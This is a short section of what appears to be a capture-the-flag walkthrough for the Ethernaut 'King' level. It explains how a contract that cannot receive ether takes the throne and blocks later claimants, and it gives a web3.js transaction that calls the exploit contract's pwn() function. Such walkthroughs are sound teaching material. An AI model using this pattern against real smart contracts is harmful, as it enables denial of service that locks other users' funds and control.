## 8. King

Send enough ethers to the KingExploit's **pwn()** function to become the King. When someone else will try to become a king, the King contract will try to send ethers to KingExploit but it will fail because of the unpayable fallback function.

```javascript
web3.eth.sendTransaction({
    to:attacker,
    from:player,
    data: web3.eth.abi.encodeFunctionSignature('pwn()'),
    value: web3.utils.toWei('1', 'ether')
})
```
